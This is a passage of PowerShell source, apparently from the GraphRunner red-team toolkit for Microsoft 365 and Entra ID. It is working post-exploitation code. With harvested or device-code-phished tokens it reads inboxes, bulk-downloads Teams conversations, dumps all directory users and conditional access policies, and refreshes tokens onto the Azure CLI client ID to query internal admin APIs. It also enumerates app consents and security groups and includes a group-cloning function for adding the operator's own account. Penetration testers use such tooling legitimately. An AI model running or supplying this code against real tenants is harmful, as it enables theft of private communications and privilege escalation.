         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while($auth -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                    $tokens = Get-GraphTokens -ExternalCall
                    $auth = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
    }
    $access_token = $tokens.access_token   
    [string]$refresh_token = $tokens.refresh_token 

    $request = Invoke-WebRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/users/$userid/mailFolders/Inbox/messages?`$top=$TotalMessages" -Headers @{"Authorization" = "Bearer $access_token"}
    $out = $request.Content | ConvertFrom-Json
    $resultsList = @()
    foreach ($hit in $out.value) {
            $subject = $hit.subject
            $sender = $hit.sender.emailAddress.address
            $receivers = $hit.toRecipients.emailAddres.address
            $date = $hit.sentDateTime
            $preview = $hit.bodyPreview
            $body = $hit.body.content

            $LogInfo = @{
                        "Subject" = $subject
                        "Sender" = $sender
                        "Receivers" = $receivers
                        "Date" = $date
                        "Body" = $body
                    }
    
            $resultsList += New-Object PSObject -Property $LogInfo
            Write-Output "Subject: $subject | Sender: $sender | Receivers: $($receivers -join ', ') | Date: $date | Message Preview: $preview"
            Write-Output ("=" * 80) 
            }
    if($OutFile){
        Write-Host -ForegroundColor yellow "[*] Writing results to $OutFile"
        $resultsList | Export-Csv -Path $OutFile -NoTypeInformation -Append
    }
}

function Get-TeamsChat{
    <#
    .SYNOPSIS

        This module downloads full Teams chat conversations. It will prompt to either download all conversations for a particular user or if you want to download individual conversations using a chat ID. This modules requires that you have a token scoped to Chat.ReadBasic, Chat.Read, or Chat.ReadWrite.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       This module downloads full Teams chat conversations. It will prompt to either download all conversations for a particular user or if you want to download individual conversations using a chat ID. This modules requires that you have a token scoped to Chat.ReadBasic, Chat.Read, or Chat.ReadWrite.
        
    .PARAMETER Tokens

        Pass the $tokens global variable after authenticating to this parameter
  
    .EXAMPLE
        
        C:\PS> Get-TeamsChat -Tokens $tokens 
        -----------
        This will list out all of the Teams chat conversations for the user and provide an option to download all conversations or just individual chats.

    #>

    param(
    [Parameter(Position = 0, Mandatory = $false)]
    [object[]]
    $Tokens = ""
    )
    if($Tokens){
            Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."   
    }
    else{
        # Login
        Write-Host -ForegroundColor yellow "[*] This modules requires that you have a token scoped to Chat.ReadBasic, Chat.Read, or Chat.ReadWrite" 
        Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
        break
    }
    $access_token = $tokens.access_token   
    [string]$refresh_token = $tokens.refresh_token 


    # Define the headers with the access token and content type
    $headers = @{
    "Authorization" = "Bearer $access_token"
    "Content-Type" = "application/json"
    }


    $graphBaseUrl = "https://graph.microsoft.com/v1.0"
    $chatEndpoint = "/me/chats?`$expand=members,lastMessagePreview&orderby=lastMessagePreview/createdDateTime%20desc"
    $messagesEndpoint = "/chats/{chatId}/messages"

    # Get the list of chats for the authenticated user

    Write-Host -ForegroundColor Yellow "[*] Now getting Teams chat conversations for current user."
    $chatsResponse = Invoke-RestMethod -Uri "$graphBaseUrl$chatEndpoint" -Headers $headers -Method Get

    $totalchats = $chatsResponse."@odata.count"
    foreach($chatresult in $chatsResponse.value){
        # Format the DateTime object as a readable string
        Write-Output "Last Message Date: $($chatresult.lastMessagePreview.createdDateTime) | Members: $($chatresult.members.email -join ', ') | Message Preview: $($chatresult.lastMessagePreview.body.content) | ChatID: $($chatresult.id)"
        Write-Host ("=" * 80) 
    }

    # Process each chat and retrieve its messages
    if ($chatsResponse.value.Count -gt 0) {
        Write-Host -ForegroundColor Cyan "[*] A total of $totalchats conversations were found. Do you want to download all of them? (Yes/No)"
        $answer = Read-Host 
        $answer = $answer.ToLower()
        if ($answer -eq "yes" -or $answer -eq "y") {
            $timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
            $folderName = "TeamsLogs-$timestamp"
            New-Item -ItemType Directory $folderName | Out-Null
            Write-Host -ForegroundColor yellow "[*] Now writing each conversation to $folderName"
            foreach ($chat in $chatsResponse.value) {
                $chatId = $chat.id
                $resultsList = @()
                $chatlastupdated = $chat.lastMessagePreview.createdDateTime -replace ":", "-"  # Replace colons with dashes

                # Get the names of chat members and prepare them for the filename
                $memberNames = ($chat.members.email | ForEach-Object { $_ -replace "\.", "_" }) -join "-"

                # Get messages for the current chat
                $messagesResponse = Invoke-RestMethod -Uri ($graphBaseUrl + $messagesEndpoint -replace '{chatId}', $chatId) -Headers $headers -Method Get

                # Process and save chat messages to a file
                if ($messagesResponse.value.Count -gt 0) {
                    $chatLogFileName = ("TeamsChatLog_" + $chatlastupdated + "_" + $memberNames + ".txt")

                    # Sort messages by createdDateTime
                    $sortedMessages = $messagesResponse.value | Sort-Object -Property createdDateTime

                    # Create or append to the chat log file
                    Foreach ($message in $sortedMessages) {
                        $LogInfo = @{
                            "Date" = $message.createdDateTime
                            "Sender" = $message.from.user.displayName
                            "Message" = $message.body.content
                        }
                        $resultsList += New-Object PSObject -Property $LogInfo
                    }
                    $resultsList | Export-Csv -Path "$foldername\$chatLogFileName" -NoTypeInformation -Append
                    Write-Host -ForegroundColor yellow "[*] Downloading coversation: $chatLogFileName."
                }
            }
        } elseif ($answer -eq "no" -or $answer -eq "n") {
            $downloadMore = $true
            while ($downloadMore) {
                # Ask the user if they want to download individual conversations
                Write-Host -ForegroundColor Cyan "[*] Do you want to download individual chat conversations? (Yes/No)"
                $individualAnswer = Read-Host
                $individualAnswer = $individualAnswer.ToLower()

                if ($individualAnswer -eq "yes" -or $individualAnswer -eq "y") {
                    # Prompt the user to enter the ChatID
                    $chatIdToDownload = Read-Host "Enter the ChatID of the conversation you want to download:"
                
                    # Find the chat with the specified ChatID
                    $selectedChat = $chatsResponse.value | Where-Object { $_.id -eq $chatIdToDownload }

                    if ($selectedChat) {
                        $chatlastupdated = $selectedChat.lastMessagePreview.createdDateTime -replace ":", "-"  # Replace colons with dashes

                        # Get the names of chat members and prepare them for the filename
                        $memberNames = ($selectedChat.members.email | ForEach-Object { $_ -replace "\.", "_" }) -join "-"

                        # Get messages for the selected chat
                        $messagesResponse = Invoke-RestMethod -Uri ($graphBaseUrl + $messagesEndpoint -replace '{chatId}', $chatIdToDownload) -Headers $headers -Method Get

                        # Process and save chat messages to a file
                        if ($messagesResponse.value.Count -gt 0) {
                            $chatLogFileName = ("TeamsChatLog_" + $chatlastupdated + "_" + $memberNames + ".txt")

                            # Sort messages by createdDateTime
                            $sortedMessages = $messagesResponse.value | Sort-Object -Property createdDateTime

                            # Create or append to the chat log file
                            $resultsList = @()
                            Foreach ($message in $sortedMessages) {
                                $LogInfo = @{
                                    "Date" = $message.createdDateTime
                                    "Sender" = $message.from.user.displayName
                                    "Message" = $message.body.content
                                }
                                $resultsList += New-Object PSObject -Property $LogInfo
                            }
                            $resultsList | Export-Csv -Path $chatLogFileName -NoTypeInformation -Append
                            Write-Host -ForegroundColor yellow "[*] Downloading conversation: $chatLogFileName."
                        } else {
                            Write-Output "[*] No messages found in the selected conversation."
                        }
                    } else {
                        Write-Output "[*] Chat with ChatID $chatIdToDownload not found."
                    }
                } else {
                    Write-Output "[*] Quitting..."
                    $downloadMore = $false  # Exit the loop
                }
            }
        } else {
            Write-Output "Invalid input. Please enter Yes or No."
        }
    } else {
        Write-Host "No chats found for the authenticated user."
    }
}

Function Get-AzureADUsers{
    <#
    .SYNOPSIS

        Gather the full list of users from the directory.        
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       Gather the full list of users from the directory.

    .PARAMETER Tokens

        Pass the $tokens global variable after authenticating to this parameter

    .PARAMETER OutFile

        File to output the results to
    
    .EXAMPLE
        
        C:\PS> Get-AzureADUsers -Tokens $tokens -OutFile users.txt
        -----------
        This will dump all Azure AD users to a text file called users.txt 

    #>
    param(
    [Parameter(Position = 0, Mandatory = $true)]
    [object[]]
    $Tokens = "",
    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $outfile = "",
    [switch]
    $GraphRun
    )
    $access_token = $tokens.access_token
    if(!$GraphRun){
    Write-Host "[*] Gathering the users from the tenant."
    }
    $usersEndpoint = "https://graph.microsoft.com/v1.0/users"
    $userlist = @()
    do{
        $request = Invoke-WebRequest -Method GET -Uri $usersEndpoint -Headers @{"Authorization" = "Bearer $access_token"}
        $out = $request.Content | ConvertFrom-Json
        $userlist += $out.value.userPrincipalName 
        if ($out.'@odata.nextLink') {
            if(!$GraphRun){
            Write-Host "[*] Gathering more users..."
            }
            $usersEndpoint = $out.'@odata.nextLink'
        }
        else {
            # No more pages, exit loop
            break
        }
    } while ($true)
    if(!$GraphRun){
    Write-Output "---All Azure AD User Principal Names---"
    $userlist
    }
    Write-Host -ForegroundColor green ("Discovered " + $userlist.count + " users")
    $userlist | Out-File -Encoding ASCII $outfile
}



Function Invoke-DumpCAPS{
<#
    .SYNOPSIS
        Tool for dumping conditional access policies
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       Tool for dumping conditional access policies       
    
    .PARAMETER Tokens
        
        Token object for auth
    
    .PARAMETER ResolveGuids
        
        Switch to resolve user and group guids if wanted

    .EXAMPLE
        
        C:\PS> Invoke-DumpCAPS -ResolveGuids
        Description
        -----------
        This command will dump conditional access policies from the tenant and resolve user and group guids.


    .EXAMPLE

        C:\PS> Invoke-DumpCAPS -Tokens $tokens -ResolveGuids
        Description
        -----------
        Use a previously authenticated refresh token to dump CAPS
    
#>


    Param(


    [Parameter(Position = 0, Mandatory = $False)]
    [switch]
    $ResolveGuids,

    [Parameter(Position = 1, Mandatory = $False)]
    [object[]]
    $Tokens = "",
    [switch]
    $GraphRun

    )

    if($Tokens){
        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
        Write-Host -ForegroundColor Yellow "[*] Refreshing token to the Azure AD Graph API..."
        $RefreshToken = $tokens.refresh_token
        $authUrl = "https://login.microsoftonline.com/$tenantid"
        $refreshbody = @{
                "resource" = "https://graph.windows.net/"
                "client_id" =     "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
                "grant_type" =    "refresh_token"
                "refresh_token" = $RefreshToken
                "scope"=         "openid"
            }

    try{
    $reftokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "$($authUrl)/oauth2/token" -Headers $Headers -Body $refreshbody
    }
    catch{
    $details=$_.ErrorDetails.Message | ConvertFrom-Json
    Write-Output $details.error
    }
    if($reftokens)
        {
            $aadtokens = $reftokens
            $access_token = $aadtokens.access_token
        }
    }
    else{
        # Login
        Write-Host -ForegroundColor yellow "[*] Initiating a device code login."

        $body = @{
            "client_id" =     "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
            "resource" =      "https://graph.windows.net/"
        }
        $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
        $Headers=@{}
        $Headers["User-Agent"] = $UserAgent
        $authResponse = Invoke-RestMethod `
            -UseBasicParsing `
            -Method Post `
            -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
            -Headers $Headers `
            -Body $body
        Write-Host -ForegroundColor yellow $authResponse.Message

        $continue = "authorization_pending"
        while($continue)
            {
    
        $body=@{
            "client_id" =  "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
            "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
            "code" =       $authResponse.device_code
        }
        try{
        $aadtokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
        }
        catch{
        $details=$_.ErrorDetails.Message | ConvertFrom-Json
        $continue = $details.error -eq "authorization_pending"
        Write-Output $details.error
        }
        if($aadtokens)
            {
                $access_token = $aadtokens.access_token
                break
            }
        Start-Sleep -Seconds 3
        }   
    }

    $tokenPayload = $aadtokens.access_token.Split(".")[1].Replace('-', '+').Replace('_', '/')
    while ($tokenPayload.Length % 4) { Write-Verbose "Invalid length for a Base-64 char array or string, adding ="; $tokenPayload += "=" }
    $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
    $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
    $tokobj = $tokenArray | ConvertFrom-Json
    $tenantid = $tokobj.tid


    $HeadersAuth = @{
        Authorization = "Bearer $access_token"
    }

    $CAPSUrl = "https://graph.windows.net/$tenantid/policies?api-version=1.61-internal"
    $CAPS = Invoke-RestMethod -Method GET -Uri $CAPSUrl -Headers $HeadersAuth
    $parsedjson = $CAPS 
    if(!$GraphRun){
        Write-Host -ForegroundColor Yellow "[*] Now dumping conditional access policies from the tenant."
    }
    # Iterate through each policy object and print the details
    foreach ($policy in $parsedJson.value) {
        $policyType = $policy.policyType
        $displayName = $policy.displayName
        $policyDetail = $policy.policyDetail | ConvertFrom-Json
        if ($policyType -eq "18"){
            # Process the PolicyDetail field
            $policyState = $policyDetail.State
            $conditionspreformat = $policyDetail.Conditions 
            $controls = $policyDetail.Controls.Control -join ", "

            # Print the policy details
            # If the policy is disabled print in gray
            if ($policyState -eq "Disabled") {
                Write-Output "Display Name: $displayName"
                Write-Output  "Policy Type: $policyType"
                Write-Output "Policy State: $policyState"
                Write-Output  "Conditions:`n"
                $formattedConditions = @()

                foreach ($condition in $conditionspreformat.PSObject.Properties) {
                    $conditionType = $condition.Name
                    $conditionData = $condition.Value

                    $conditionText = ""

                    foreach ($includeExclude in @("Include", "Exclude")) {
                        if ($conditionData.$includeExclude) {
                            $conditionValues = @()

                            foreach ($includeData in $conditionData.$includeExclude) {
                                $includeType = $includeData.PSObject.Properties.Name
                                $includeValues = $includeData.PSObject.Properties.Value -split ', '  
                                $resolvedUsers = @()
                                if($ResolveGuids){
                                    foreach ($guid in $includeValues) {
                                        if ($guid -match '^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$') {
                                            $resolvedUser = ResolveGUID $guid $HeadersAuth
                                            $resolvedUsers += $resolvedUser
                                        } else {
                                            $resolvedUsers += $guid
                                        }
                                    }
                                }
                                else{
                                    foreach ($guid in $includeValues) {
                                        $resolvedUsers += $guid
                                    }
                                }
                                $includeValue = "$($resolvedUsers -join ', ')"
                                $conditionValues += "`t`t`t$includeType : $includeValue"
                            }

                            if ($conditionValues.Count -gt 0) {
                                $conditionText += "`t`t$includeExclude :`n$($conditionValues -join "`n")`n"
                            }
                        }
                    }

                    $formattedCondition = "`t$conditionType :`n$conditionText"
                    Write-Output $formattedCondition
                }
                Write-Output "Controls: $controls"
            } else {
                Write-Output "Display Name: $displayName"
                Write-Output "Policy Type: $policyType"
                Write-Output "Policy State: $policyState"
                Write-Output "Conditions:`n"
                $formattedConditions = @()

                foreach ($condition in $conditionspreformat.PSObject.Properties) {
                    $conditionType = $condition.Name
                    $conditionData = $condition.Value

                    $conditionText = ""

                    foreach ($includeExclude in @("Include", "Exclude")) {
                        if ($conditionData.$includeExclude) {
                            $conditionValues = @()

                            foreach ($includeData in $conditionData.$includeExclude) {
                                $includeType = $includeData.PSObject.Properties.Name
                                $includeValues = $includeData.PSObject.Properties.Value -split ', '  
                                $resolvedUsers = @()
                                if($ResolveGuids){
                                    foreach ($guid in $includeValues) {
                                        if ($guid -match '^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$') {
                                            $resolvedUser = ResolveGUID $guid $HeadersAuth
                                            $resolvedUsers += $resolvedUser
                                        } else {
                                            $resolvedUsers += $guid
                                        }
                                    }
                                }
                                else{
                                    foreach ($guid in $includeValues) {
                                        $resolvedUsers += $guid
                                    }
                                }
                                $includeValue = "$($resolvedUsers -join ', ')"
                                $conditionValues += "`t`t`t$includeType : $includeValue"
                            }

                            if ($conditionValues.Count -gt 0) {
                                $conditionText += "`t`t$includeExclude :`n$($conditionValues -join "`n")`n"
                            }
                        }
                    }

                    $formattedCondition = "`t$conditionType :`n$conditionText"
                    $formattedCondition
                }
    
                Write-Output "Controls: $controls"
            }
            # Separator
            Write-Output ("=" * 80) 
        }
    }
}



function ResolveGUID($guid,$HeadersAuth) {
    $url = "https://graph.windows.net/$tenantid/directoryObjects/$guid/?api-version=1.61-internal"
    try{
    $resolvedObject = Invoke-RestMethod -Method Get -Uri $url -Headers $HeadersAuth -ErrorAction Stop
    } catch {
    return "Unresolved: $guid"
    continue
    }
    if ($resolvedObject.objectType -eq "User") {
        return "$($resolvedObject.userPrincipalName)"
    } elseif ($resolvedObject.objectType -eq "Group") {
        return "$($resolvedObject.displayName)"
    } else {
        return "Unresolved: $guid"
    }
}



Function Invoke-DumpApps{
    <#
        .SYNOPSIS
            Dump all of the app registrations and external enterprise apps as well as list members that have consented to permissions on their accounts.
            Author: Beau Bullock (@dafthack)
            License: MIT
            Required Dependencies: None
            Optional Dependencies: None

        .DESCRIPTION
        
           Dump all of the app registrations and external enterprise apps as well as list members that have consented to permissions on their accounts.

        .EXAMPLES      
        
            C:\PS> Invoke-DumpApps -Tokens $tokens
    #>

    Param(

        [Parameter(Position = 0, Mandatory = $False)]
        [object[]]
        $Tokens = "",
        [switch]
        $GraphRun
    )

    if($Tokens){
        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
    }
    else{
         # Login
         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while($auth -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                    $tokens = Get-GraphTokens -ExternalCall
                    $auth = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
    }
    $accesstoken = $tokens.access_token   
    [string]$refreshToken = $tokens.refresh_token   
    if(!$GraphRun){
        Write-Host -ForegroundColor yellow "[*] Getting Microsoft Graph Object ID"
    }
    # Get full service principal list

    $initialUrl = "https://graph.microsoft.com/v1.0/servicePrincipals"
    $headers = @{"Authorization" = "Bearer $accesstoken"}

    # Initialize an array to store all collected data
    $allData = @()

    # Loop until there's no more nextLink
    do {
        # Invoke the web request
        $response = Invoke-WebRequest -Uri $initialUrl -Headers $headers

        # Convert the response content to JSON
        $jsonData = $response.Content | ConvertFrom-Json

        # Add the current page's data to the array
        $allData += $jsonData.value

        # Check if there's a nextLink
        if ($jsonData.'@odata.nextLink') {
            $initialUrl = $jsonData.'@odata.nextLink'
        } else {
       
            break
        }
    } while ($true)

    $appDisplayNameToSearch = "Microsoft Graph"
    $graphId = $allData | Where-Object { $_.appDisplayName -eq $appDisplayNameToSearch } | Select-Object -ExpandProperty appId
    $graphIdInternal = $allData | Where-Object { $_.appDisplayName -eq $appDisplayNameToSearch } | Select-Object -ExpandProperty Id
    Write-Output "Graph ID: $graphId"
    Write-Output "Internal Graph ID: $graphIdInternal"

    # Get Object IDs of individual permissions
    Write-Host -ForegroundColor yellow "[*] Now getting object IDs for scope objects..."
    $spns = Invoke-WebRequest -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$graphIdInternal" -Headers $headers
    $spnsjson = $spns.Content | ConvertFrom-Json

    # Construct the Graph API endpoint
    $graphApiUrl = "https://graph.microsoft.com/v1.0"
    if(!$GraphRun){
    Write-Host -ForegroundColor yellow "[*] App Registrations:"
    }
    # Query app registrations
    $appRegistrations = Invoke-RestMethod -Uri "$graphApiUrl/applications" -Headers @{ Authorization = "Bearer $accessToken" }

    # Separator
                Write-Output ("=" * 80) 

    # Loop through each app registration
    foreach ($app in $appRegistrations.value) {
        $appId = $app.appId
        $appName = $app.displayName
        $createtime = $app.createdDateTime
        $signinaudience = $app.signInAudience
    
        # Query users who have consented to the app's permissions
        $approleurl = ($graphApiUrl + "/servicePrincipals(appId='" + $appId + "')/appRoleAssignedTo")
        $consentedUsers = Invoke-RestMethod -Uri $approleurl -Headers @{ Authorization = "Bearer $accessToken" }
    
        # Display app information and consented users
        Write-Output "App Name: $appName (App ID: $appId)"
        Write-Output "Creation Date: $createtime"
        Write-Output "Sign-In Audience: $signinaudience"
        foreach ($user in $consentedUsers.value) {
            $userId = $user.principalId
            $userDisplayName = $user.principalDisplayName
            Write-Output "Consented User: $userDisplayName (User ID: $userId)"
        }
        # Loop through each resource access entry
        foreach ($resourceAccess in $app.requiredResourceAccess) {
            $resourceAppId = $resourceAccess.resourceAppId
            $appscopes = @()
            $delegatedscopes = @()

            # Loop through each resource access item
            foreach ($accessItem in $resourceAccess.resourceAccess) {
                $scopeGuid = $accessItem.id
            
                # Use the spn list to find names of permissions
                foreach($approle in $spnsjson.appRoles){
                    if ($scopeGuid -like $approle.id) {
                        $scopeName = $approle.value
                        $appscopes += $scopeName
                    }
                }
                foreach($scoperole in $spnsjson.oauth2PermissionScopes){
                    if ($scopeGuid -like $scoperole.id) {
                        $dscopeName = $scoperole.value
                        $delegatedscopes += $dscopeName
                    }
                }
            }

            # Display the resource app ID and associated permission names (scopes)
            if ($appscopes.Count -gt 0) {
                Write-Output "App Permissions (Scopes): $($appscopes -join ', ')"
            }
            if ($delegatedscopes -gt 0) {
                Write-Output "Delegated Permissions (Scopes): $($delegatedscopes -join ', ')"
            }
        }
        Write-Output ""
        # Separator
                Write-Output ("=" * 80) 
    } 
            if(!$GraphRun){
            Write-Host -ForegroundColor yellow "[*] Now looking for external apps. Any apps displayed below are not owned by the current tenant or Microsoft's main app tenant."
            }
            Write-Output ("=" * 80) 

            $orginfo = Invoke-RestMethod -Uri "$graphApiUrl/organization" -Headers $headers
            $tenantid = $orginfo.value.id

            $authUrl = "https://login.microsoftonline.com/$tenantid"
            $unsupurl = "https://main.iam.ad.ext.azure.com"

            $unsupbody = @{
                    "resource" = "74658136-14ec-4630-ad9b-26e160ff0fc6"
                    "client_id" =     "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
                    "grant_type" =    "refresh_token"
                    "refresh_token" = $refreshToken
                    "scope"=         "openid"
                }

            $unsuptokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "$($authUrl)/oauth2/token" -Headers $Headers -Body $unsupbody
            $unsupaccesstoken = $unsuptokens.access_token

        foreach ($serviceprincipal in $allData){
            $EntAppsScope = ""
            # Filter out Microsoft Tenant service principals like Kaizala, Teams, etc... MS Tenant = f8cdef31-a31e-4b4a-93e4-5f571e91255a
            if ($serviceprincipal.AppOwnerOrganizationId -ne "f8cdef31-a31e-4b4a-93e4-5f571e91255a" -and $serviceprincipal.AppOwnerOrganizationId -ne $tenantid)
            {
               $body = @{
                "client_id" =     "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
                "resource" =      "74658136-14ec-4630-ad9b-26e160ff0fc6"
            }
                $unsupheaders = @{
                    "Authorization"          = "Bearer " + $unsupaccesstoken
                    "Content-type"           = "application/json"
                    "X-Requested-With"       = "XMLHttpRequest"
                    "x-ms-client-request-id" = [guid]::NewGuid()
                    "x-ms-correlation-id"    = [guid]::NewGuid()
                }

                $unsupfullurl = ($unsupurl + "/api/EnterpriseApplications/" + $serviceprincipal.Id + "/ServicePrincipalPermissions?consentType=User&userObjectId=")
                $EntAppsScope = Invoke-RestMethod -Method GET -Uri $unsupfullurl -Headers $unsupheaders

                $unsupAdminfullurl = ($unsupurl + "/api/EnterpriseApplications/" + $serviceprincipal.Id + "/ServicePrincipalPermissions?consentType=Admin&userObjectId=")
                $EntAppsAdminScope = Invoke-RestMethod -Method GET -Uri $unsupAdminfullurl -Headers $unsupheaders
            
            

                Write-Output ("External App: " + $serviceprincipal.displayName)
                Write-Output ("AppId: " + $serviceprincipal.AppId)
                Write-Output ("Object ID: " + $serviceprincipal.Id)
                Write-Output ("appOwnerOrganizationId: " + $serviceprincipal.appOwnerOrganizationId)
                Write-Output ("Creation Date: " + $serviceprincipal.createdDateTime)
                Write-Output "Scope of Consent:"
                Foreach ($Entscopeitem in $EntAppsScope){
                $principals = @()
                foreach($userorgroup in $Entscopeitem.principalIds){
                    $userobject = Invoke-RestMethod -uri "$($graphApiUrl)/users/$userorgroup" -Headers $headers
                    $principals += $userobject.userPrincipalName
                }
                Write-Output ($Entscopeitem.permissionId + ", " + $Entscopeitem.permissionType + ", " + $($principals -join '; '))
                }
                Foreach ($Entscopeadminitem in $EntAppsAdminScope){
                $principals = @()
                foreach($userorgroup in $Entscopeadminitem.principalIds){
                    $userobject = Invoke-RestMethod -uri "$($graphApiUrl)/users/$userorgroup" -Headers $headers
                    $principals += $userobject.userPrincipalName
                }
                Write-Output ($Entscopeadminitem.permissionId + ", " + $Entscopeadminitem.permissionType + ", " + $($principals -join '; '))
                }
                Write-Output ""
                Write-Output ("=" * 80) 
            }
        
        }
}



function Get-SecurityGroups{
    <#
    .SYNOPSIS

        Gather the security groups and members from the directory.        
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       Gather the security groups and members from the directory.

    .PARAMETER AccessToken

        Pass the $tokens.access_token global variable after authenticating to this parameter

    .EXAMPLE
        
        C:\PS> Get-SecurityGroups -AccessToken $tokens.access_token
        -----------
        This will dump all security groups.
    #>
    param (
            [string] $AccessToken,
            [switch] $GraphRun
        )
    $headers = @{
        Authorization = "Bearer $accessToken"
    }
    if(!$GraphRun){
    Write-Host -ForegroundColor Yellow "[*] Now getting a list of groups along with members from the directory..."
    }
    # Get all groups and group types
    $graphApiUrl = "https://graph.microsoft.com/v1.0"
    $groupsUrl = "$graphApiUrl/groups?$filter=securityEnabled eq true"

    $groupsResponse = Invoke-RestMethod -Uri $groupsUrl -Headers $headers -Method Get

    $groups = $groupsResponse.value


    #Get Group Members

    $groupsWithMemberIDs = @()

    foreach ($group in $groups) {
        $groupId = $group.id
        $membersUrl = "$graphApiUrl/groups/$groupId/members"

        $membersResponse = Invoke-RestMethod -Uri $membersUrl -Headers $headers -Method Get
        $members = $membersResponse.value

        $memberIds = $members | ForEach-Object { $_.id }

        $groupInfo = @{
            GroupName = $group.displayName
            MemberIds = $memberIds -join ","
        }
        Write-Output ("Group Name: " + $group.displayName + " | Members: " + ($($members.userPrincipalName) -join ', '))
        Write-Output ""
        Write-Output ("=" * 80) 
        $groupsWithMemberIDs += New-Object PSObject -Property $groupInfo
    }

    return $groupsWithMemberIDs

}


function Create-SecurityGroupWithMembers {
    param (
        [string] $AccessToken,
        [string] $DisplayName,
        [string[]] $MemberIds
    )

    $graphApiUrl = "https://graph.microsoft.com/v1.0"
    $createGroupUrl = "$graphApiUrl/groups"

    $headers = @{
        Authorization = "Bearer $AccessToken"
        "Content-Type" = "application/json"
    }

    $groupProperties = @{
        displayName = $DisplayName
        securityEnabled = $true
        mailEnabled = $false
        mailNickname = $DisplayName -replace ' ', ''
        "members@odata.bind" = $MemberIds
    }

    $groupData = @{
        displayName = $DisplayName
        securityEnabled = $true
        mailEnabled = $false
        mailNickname = $DisplayName -replace ' ', ''
        "members@odata.bind" = $MemberIds
    }

    $groupJson = $groupData | ConvertTo-Json

    $response = Invoke-RestMethod -Uri $createGroupUrl -Headers $headers -Method Post -Body $groupJson

    if ($response -ne $null) {
        Write-Host -ForegroundColor Green "Security Group '$DisplayName' created successfully."
    } else {
        Write-Error "Error creating the security group."
    }
}



function Invoke-SecurityGroupCloner{

    <#
        .SYNOPSIS
            Clones a security group in Azure Active Directory and allows you to add your own account.
            Author: Beau Bullock (@dafthack)
            License: MIT
            Required Dependencies: None
            Optional Dependencies: None

        .DESCRIPTION
        
           Clones a security group in Azure Active Directory and allows you to add your own account.

        .EXAMPLES      
        
            C:\PS> Invoke-SecurityGroupCloner -Tokens $tokens
    #>

    Param(
        [Parameter(Position = 0, Mandatory = $False)]
        [object[]]
        $Tokens = ""
    )

    if($Tokens){
        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
    }
    else{
         # Login
         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while($auth -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                    $tokens = Get-GraphTokens -ExternalCall
                    $auth = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
    }
    $accesstoken = $tokens.access_token   
    [string]$refreshToken = $tokens.refresh_token 

    $headers = @{
        Authorization = "Bearer $accessToken"
    }

